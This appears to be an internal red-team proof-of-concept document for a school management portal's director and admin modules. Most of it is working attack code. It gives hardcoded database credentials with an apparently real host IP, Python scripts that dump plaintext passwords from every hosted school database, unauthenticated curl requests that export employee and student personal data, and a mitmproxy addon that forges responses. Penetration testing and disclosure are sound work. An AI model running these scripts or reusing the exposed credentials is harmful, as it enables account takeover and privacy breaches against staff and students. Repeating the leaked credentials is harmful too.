# Director Portal — Proof-of-Concept Exploits
**Date:** June 10, 2026  
**Module:** Director / AdminAdmin (CORS Group)  
**Reviewer:** Internal Red Team  
**Classification:** Internal Use Only

---

> **Warning:** PoCs marked "No credentials required" require no authentication whatsoever. All others require only a valid session cookie obtainable through normal login. Replace `TARGET` with the application base URL and `DB_HOST` with the host identified in finding DR-01. Do not execute against production systems without written authorization.

---

## PoC DR-01 — Direct Database Access via Hardcoded Credentials
**Finding:** DR-01 | **Severity:** CRITICAL (10.0) | **No web application access needed**

### Credentials Extracted from Source
```
Host:     141.164.36.7   (or value from DB_HOST env var)
Port:     3306
Username: ckgroup_dev
Password: Sels2019
```
Source: `DirectorFinanceReportsController.php` — lines ~22–31, ~125–134, ~228–237, ~330–339

### Exploit — Direct MySQL Connection
```bash
# Connect directly to the production database server — no web application interaction
mysql -h 141.164.36.7 -P 3306 -u ckgroup_dev -p'Sels2019'
```

### Exploit — Enumerate All Hosted Schools
```sql
-- Once connected:
SHOW DATABASES;
-- Expected: one database per school on the hosted platform

-- Dump all user accounts from a specific school's DB
USE <school_db_name>;
SELECT email, password, passwordstr, type FROM users;
-- passwordstr = plaintext passwords (see Admin portal finding A-02)
```

### Exploit — Automated Python Dump
```python
#!/usr/bin/env python3
"""
Dump credentials from all hosted school databases using hardcoded credentials.
For authorized penetration testing only.
"""
import pymysql, json

DB_HOST = "141.164.36.7"
DB_USER = "ckgroup_dev"
DB_PASS = "Sels2019"

conn = pymysql.connect(host=DB_HOST, port=3306, user=DB_USER, password=DB_PASS)
cursor = conn.cursor()

# List all databases
cursor.execute("SHOW DATABASES")
databases = [row[0] for row in cursor.fetchall()]
print(f"[+] Found {len(databases)} databases: {databases}")

creds = []
for db in databases:
    try:
        cursor.execute(f"USE `{db}`")
        cursor.execute("SELECT email, passwordstr, type FROM users WHERE deleted=0 LIMIT 100")
        rows = cursor.fetchall()
        for row in rows:
            creds.append({"db": db, "email": row[0], "password": row[1], "type": row[2]})
    except Exception as e:
        pass  # table may not exist in non-school DBs

print(json.dumps(creds, indent=2))
conn.close()
```

---

## PoC DR-02 — Unauthenticated Employee PII Dump via `passData`
**Finding:** DR-02 | **Severity:** CRITICAL | **No credentials required**

### Exploit — Dump All Employee Personal Information
```bash
# No cookies, no session — completely unauthenticated
curl "http://TARGET/passData?action=getemployees" | python3 -m json.tool
```

Expected response (excerpt):
```json
[
  {
    "id": 1,
    "userid": 45,
    "lastname": "Santos",
    "firstname": "Maria",
    "gender": "FEMALE",
    "designation": "Teacher I",
    "dob": "1985-03-15",
    "address": "123 Rizal Street, Quezon City",
    "email": "msantos@school.edu",
    "employmentstatus": "Regular",
    "datehired": "2010-06-01",
    "educationinfo": [...],
    "otherportals": [{"usertype":6,"utype":"Administrator"}, ...]
  },
  ...
]
```

### Exploit — Dump Real-Time Employee Attendance
```bash
curl "http://TARGET/passData?action=getemployeeattendance"
# Returns all employees with today's AM IN / AM OUT / PM IN / PM OUT times
```

### Exploit — Dump Financial Receivables
```bash
# Get all accounts receivable for the current school year
curl "http://TARGET/passData?action=getreceivables&syid=2&semid=1&datefrom=2026-01-01&dateto=2026-12-31"
```

### Exploit — Dump All Enrolled Student IDs
```bash
curl "http://TARGET/passData?action=getfinancestudents&syid=2&semid=1"
# Returns all enrolled student IDs across K-12, SHS, and College
```

### Automated Full PII Export
```python
#!/usr/bin/env python3
"""Export all available data from unauthenticated passData endpoint."""
import requests, json

TARGET  = "http://TARGET"
actions = ["getschoolyears", "getsemesters", "getpaymenttypes", "getterminals",
           "getemployees", "getemployeeattendance", "getfinancestudents"]

for action in actions:
    r = requests.get(f"{TARGET}/passData", params={"action": action})
    if r.status_code == 200:
        data = r.json()
        print(f"\n=== {action} ({len(data)} records) ===")
        print(json.dumps(data[:3], indent=2, default=str))  # first 3 records
        with open(f"dump_{action}.json", "w") as f:
            json.dump(data, f, indent=2, default=str)
        print(f"[+] Saved to dump_{action}.json")
```

---

## PoC DR-03 — Unauthenticated Director Finance Dashboard Access
**Finding:** DR-03 | **Severity:** CRITICAL | **No credentials required**

### Exploit — Access All Finance Dashboards
```bash
# Cashier transactions dashboard — no auth
curl -v "http://TARGET/director/finance/cashiertransactionsindex"
# HTTP 200 — full HTML dashboard with terminal and payment type configuration

# Collections dashboard
curl "http://TARGET/director/finance/collectionsindex"

# Accounts receivable
curl "http://TARGET/director/finance/accountreceivablesindex"

# Expenses
curl "http://TARGET/director/finance/expensesindex"
```

### Exploit — Access AdminAdmin Finance/HR Dashboards
```bash
curl "http://TARGET/finance/index"
curl "http://TARGET/hr/index"
curl "http://TARGET/academic/index"
curl "http://TARGET/enrollmentReport"
curl "http://TARGET/cashtransReport"
```

---

## PoC DR-04 — MITM via Disabled SSL Verification
**Finding:** DR-04 | **Severity:** HIGH | **Network position required**

### Attack Setup (mitmproxy)
```bash
# On a network-adjacent machine, intercept outbound Guzzle requests
mitmproxy --mode transparent --ssl-insecure -p 8080

# The Director server makes requests like:
# GET http://<eslink>/passData?action=getschoolyears
# With CURLOPT_SSL_VERIFYPEER=false, the server accepts any certificate
```

### Crafted Response
```python
# Intercept and replace financial data in mitmproxy addon
def response(flow):
    if "passData" in flow.request.url and "getschoolyears" in flow.request.url:
        # Replace with forged school year data
        flow.response.content = b'[{"id":1,"sydesc":"2026-2027","isactive":"1"}]'
```

---

## PoC BUG-DR-02 — Crash Finance Dashboard With Missing Session
**Finding:** BUG-DR-02 | **Severity:** High Bug | **No credentials required**

### Exploit — Trigger 500 Error on Any Finance Dashboard
```bash
# Fresh request with no session cookie — schoolid not in session
# The method calls Session::get('schoolid') → null → DB query returns null
# → $schoolInfo->islocal throws "Trying to get property of non-object"
curl -v "http://TARGET/director/finance/cashiertransactionsindex"
# HTTP 500 — may leak stack trace in non-production config
```

---

## PoC DR-01 Extended — Full Impact Chain (Source to All Schools Compromised)
Demonstrates the complete chain from source code access to multi-school database compromise:

```python
#!/usr/bin/env python3
"""
Full Director portal impact chain:
1. Extract credentials from hardcoded source
2. Connect directly to multi-school DB server
3. Enumerate all school databases
4. Extract all user credentials from each school
"""
import pymysql, requests, json, sys

# Step 1: Credentials extracted from DirectorFinanceReportsController.php
CREDS = {"host": "141.164.36.7", "port": 3306,
         "user": "ckgroup_dev", "password": "Sels2019"}

# Step 2: Connect to DB server directly
print("[*] Connecting to production database server...")
conn = pymysql.connect(**CREDS)
cursor = conn.cursor(pymysql.cursors.DictCursor)

# Step 3: Enumerate databases
cursor.execute("SHOW DATABASES")
dbs = [r["Database"] for r in cursor.fetchall()
       if r["Database"] not in ("information_schema", "mysql", "performance_schema", "sys")]
print(f"[+] Found {len(dbs)} school databases: {', '.join(dbs)}")

# Step 4: Extract credentials from each school
all_creds = {}
for db in dbs:
    try:
        cursor.execute(f"USE `{db}`")
        cursor.execute("SELECT email, password, passwordstr, type FROM users WHERE deleted=0")
        rows = cursor.fetchall()
        all_creds[db] = rows
        print(f"[+] {db}: extracted {len(rows)} user accounts "
              f"({sum(1 for r in rows if r['passwordstr'] and r['passwordstr'] != '')} with plaintext passwords)")
    except Exception as e:
        print(f"[-] {db}: {e}")

conn.close()

# Step 5: Output credentials
with open("all_schools_credentials.json", "w") as f:
    json.dump(all_creds, f, indent=2, default=str)
print(f"\n[+] All credentials saved to all_schools_credentials.json")
print(f"[+] Total accounts extracted: {sum(len(v) for v in all_creds.values())}")
```

---

*End of Director Portal PoC*
